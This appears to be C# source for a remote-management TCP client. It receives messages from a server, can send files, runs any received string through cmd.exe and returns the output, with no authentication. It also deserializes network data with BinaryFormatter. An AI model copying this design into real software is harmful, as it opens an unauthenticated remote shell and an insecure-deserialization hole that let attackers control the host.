using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using HeaderPack;
using System.Diagnostics;
using System.Threading.Tasks;
using xmlSettings;
using System.Text;
using clSpec;

namespace DPClient
{
    class TCPClient
    {
        // IPAddress servAdress = IPAddress.Parse("127.0.0.1");
        public delegate void SocketDisconnectedEventHandler();
        public event SocketDisconnectedEventHandler Disconnected;
        public XmlSet settings = new XmlSet();
        public TcpClient tcpClient = new TcpClient();
        private FilePr file = new FilePr();
        private IPAddress thisIpaddres;
        public bool run;
        public string ErrorMsg;
        public bool sysWasChecked = false;
        private string settingsPath = "settings.xml";
        public bool Connect(IPAddress servAdress, XmlSet set)
        {
            try
            {
                
                settings = set;
                while (!tcpClient.Connected)
                {
                    run = true;
                    tcpClient.Connect(servAdress, 3155);
                    
                   
                }
                this.Check_in();
                return tcpClient.Connected;
            }

            catch (Exception ex)
            {
                run = tcpClient.Connected;
                //throw new Exception(ex.Message);
                return run;
            }
        }
        public void Disonnect()
        {
            if (tcpClient != null)
            {
                run = false;
                tcpClient.Client.Close();
                tcpClient.Close();
                tcpClient = null;
                Disconnected();
            }
        }
        public void Check_in() // первоначальное отправление заголовка и класса настроек
        {
            String host = Dns.GetHostName();
            // Получение ip-адреса.
            IPAddress ip = Dns.GetHostByName(host).AddressList[0];
            thisIpaddres = ip;
            byte[] settingsByte;
            using (MemoryStream Memory = new MemoryStream()) // сериализация xml
            {
                BinaryFormatter bf = new BinaryFormatter();
                bf.Serialize(Memory, settings);
                Memory.Position = 0;
                settingsByte = new byte[Memory.Length];
                var r = Memory.Read(settingsByte, 0, settingsByte.Length);
            }
            this.Send(ServiceMessage.Authorization, settings.guid, settingsByte);
            //Task.Run(() => Read());
           Read();

        }
        public async void Read()
        {
            while (run == true)
            {
                byte[] data = default(byte[]);
                byte[] buffer;
                byte[] header;

                NetworkStream Network;
                HeaderDsc headerDsc;


                try
                {
                    Network = tcpClient.GetStream();

                    header = new byte[TCPPack.HeaderSize];

                    int readBytes = await  Network.ReadAsync(header, 0, header.Length); // считывание заголовка, должно быть ассинхронно

                    if (readBytes == 0)
                    {
                        Console.WriteLine("Remote host dropped connection");
                        return;

                    }
                    else
                    {
                        int lengthHeader = BitConverter.ToInt32(header, 0);

                        using (MemoryStream Memory = new MemoryStream(lengthHeader)) // десериализация заголовка
                        {
                            buffer = new byte[lengthHeader];
                            readBytes = Network.Read(buffer, 0, buffer.Length);
                            Memory.Write(buffer, 0, readBytes);
                            Memory.Position = 0;

                            BinaryFormatter bf = new BinaryFormatter();
                            headerDsc = (HeaderDsc)bf.Deserialize(Memory);
                        }
                    }
                    Console.WriteLine((headerDsc.guid).ToString());
                    if (headerDsc.DataSize > 0)
                    {
                        buffer = new byte[TCPPack.BufferSize];
                        data = new byte[headerDsc.DataSize];

                        int lengthPack = buffer.Length;
                        int receivedBytes = 0;

                        while (true)
                        {
                            var remBytes = headerDsc.DataSize - receivedBytes;
                            lengthPack = (remBytes < lengthPack) ? (int)remBytes : buffer.Length;// если осталось получить байтов меньше чем буффер ждем конкретно это кол-во байтов
                            readBytes = Network.Read(buffer, 0, lengthPack);

                            if (readBytes == 0)
                            {
                                Console.WriteLine("Remote host dropped connection");
                                break;
                            }

                            // Записываем строго столько байтов сколько прочтено методом Read()
                            Buffer.BlockCopy(buffer, 0, data, receivedBytes, readBytes);
                            receivedBytes += readBytes;

                            // Как только получены все байты файла, останавливаем цикл,
                            // иначе он заблокируется в ожидании новых сетевых данных
                            if (headerDsc.DataSize == receivedBytes)
                            {
                                // Все данные пришли. Выходим из цикла (readBytes всегда > 0)
                                break;
                            }

                        }
                        Console.WriteLine("data aw");
                        DataProcess(data, headerDsc);// здесь должна быть обработка полученных данных
                    }

                    


                }
                catch (Exception ex)
                {
                    ErrorMsg = ex.Message;
                    run = false;
                    Disonnect();
                }
                finally
                {
                    // Обнулим все ссылки на многобайтные объекты
                    headerDsc = null;
                    Network = null;
                    data = null;
                    header = null;
                    buffer = null;

                }

            }

        }
        private void DataProcess(byte[] data, HeaderDsc headerDsc)
        {
            switch (headerDsc.Message)
            {
                case ServiceMessage.file:
                    break;
                case ServiceMessage.data:
                    break;
                case ServiceMessage.clCommand:

                     int comIndex = 0;
                     BitConverter.ToInt32(data, comIndex);
                     string s = clCommand(comIndex);
                     byte[] answer1 = Encoding.Default.GetBytes(s);
                     this.Send(ServiceMessage.clCommand, settings.guid, answer1);
                    break;
                case ServiceMessage.cmd:

                    string str = Encoding.Default.GetString(data);
                    Cmd ans = new Cmd();
                    ans.strCmd = runCommand(str);
                    ans.destGuid = settings.guid;
                    byte[] answer;
                    using (MemoryStream Memory = new MemoryStream()) // сериализация заголовка
                    {
                        BinaryFormatter bf = new BinaryFormatter();
                        bf.Serialize(Memory, ans);
                        Memory.Position = 0;
                        answer = new byte[Memory.Length];
                        var r = Memory.Read(answer, 0, answer.Length);
                    }
                    this.Send(ServiceMessage.cmd, settings.guid, answer);
                    break;
            }
        }
        static string runCommand(string cmd)// обработка полученных cmd комманд
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = cmd;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.ErrorDataReceived += new DataReceivedEventHandler(OutputHandler);
            process.Start();
            process.BeginErrorReadLine();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;
        }


        private string clCommand(int index)
        { 
            
            switch (index)
            { 
                case 0:
                    sysWasChecked = true;
                    return "Ok";
                    

                
            }
            return "Command not found";
        }
        static void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            Console.WriteLine(outLine.Data);
        }

        public void Send(ServiceMessage message, Guid guid, byte[] data)
        {
            byte[] buffer;
            byte[] header;
            byte[] infobuffer; //???
            NetworkStream Network;
            HeaderDsc headerDsc;


            if (tcpClient == null || !tcpClient.Connected)
            {
                ErrorMsg = "Удаленный хост принудительно разорвал существующее подключение.";
                return;
            }
            try
            {
                headerDsc = new HeaderDsc(); // формирование заголовка
                headerDsc.Message = message;
                headerDsc.guid = guid;
                headerDsc.DataSize = data.Length;

                using (MemoryStream Memory = new MemoryStream()) // сериализация заголовка
                {
                    BinaryFormatter bf = new BinaryFormatter();
                    bf.Serialize(Memory, headerDsc);
                    Memory.Position = 0;
                    infobuffer = new byte[Memory.Length];
                    var r = Memory.Read(infobuffer, 0, infobuffer.Length);
                }

                buffer = new byte[TCPPack.BufferSize];
                header = BitConverter.GetBytes(infobuffer.Length);

                Buffer.BlockCopy(header, 0, buffer, 0, header.Length);
                Buffer.BlockCopy(infobuffer, 0, buffer, header.Length, infobuffer.Length);

                int bufferShift = header.Length + infobuffer.Length; // сдвиг на размер заголовка
                int rdShift = 0; // сдвиг на кол-во переданных байт
                int lengthPack = 0; // фактический размер буффера
                Network = tcpClient.GetStream();

                while (rdShift < (headerDsc.DataSize + bufferShift)) // пока переданное кол-во байтов меньше ожидаемого 
                {
                    var remBytes = headerDsc.DataSize - rdShift;

                    if (remBytes < buffer.Length) lengthPack = remBytes;
                    else lengthPack = buffer.Length - bufferShift;

                    Buffer.BlockCopy(data, rdShift, buffer, bufferShift, lengthPack);
                    rdShift += lengthPack;
                    Network.Write(buffer, 0, lengthPack + bufferShift);
                    bufferShift = 0;




                }



            }
            catch (Exception ex)
            {
                ErrorMsg = ex.Message;
                this.Disonnect();
            }
            finally
            {
                header = null;
                infobuffer = null;
                buffer = null;
                Network = null;
                headerDsc = null;
            }
        }
        public void SendFile(ServiceMessage message, Guid guid, string path, string ext)
        {
            byte[] buffer;
            byte[] header;
            byte[] infobuffer; //???
            NetworkStream Network;
            HeaderDsc headerDsc;


            if (tcpClient == null || !tcpClient.Connected)
            {
                ErrorMsg = "Удаленный хост принудительно разорвал существующее подключение.";
                return;
            }
            try
            {
                byte[] data = file.GetBytes(path);
                headerDsc = new HeaderDsc(); // формирование заголовка
                headerDsc.Message = message;
                headerDsc.guid = guid;
                headerDsc.ext = ext;
                headerDsc.Hex = file.CheckSum(path); // хэш сумма для проверки целостности
                headerDsc.DataSize = data.Length;

                using (MemoryStream Memory = new MemoryStream()) // сериализация заголовка
                {
                    BinaryFormatter bf = new BinaryFormatter();
                    bf.Serialize(Memory, headerDsc);
                    Memory.Position = 0;
                    infobuffer = new byte[Memory.Length];
                    var r = Memory.Read(infobuffer, 0, infobuffer.Length);
                }

                buffer = new byte[TCPPack.BufferSize];
                header = BitConverter.GetBytes(infobuffer.Length);

                Buffer.BlockCopy(header, 0, buffer, 0, header.Length);
                Buffer.BlockCopy(infobuffer, 0, buffer, header.Length, infobuffer.Length);

                int bufferShift = header.Length + infobuffer.Length; // сдвиг на размер заголовка
                int rdShift = 0; // сдвиг на кол-во переданных байт
                int lengthPack = 0; // фактический размер буффера
                Network = tcpClient.GetStream();

                while (rdShift < (headerDsc.DataSize + bufferShift)) // пока переданное кол-во байтов меньше ожидаемого 
                {
                    var remBytes = headerDsc.DataSize - rdShift;

                    if (remBytes < buffer.Length) lengthPack = remBytes;
                    else lengthPack = buffer.Length - bufferShift;

                    Buffer.BlockCopy(data, rdShift, buffer, bufferShift, lengthPack);
                    rdShift += lengthPack;
                    Network.Write(buffer, 0, lengthPack + bufferShift);
                    bufferShift = 0;




                }



            }
            catch (Exception ex)
            {
                ErrorMsg = ex.Message;
                this.Disonnect();
            }
            finally
            {
                header = null;
                infobuffer = null;
                buffer = null;
                Network = null;
                headerDsc = null;
            }
        }

    }

}
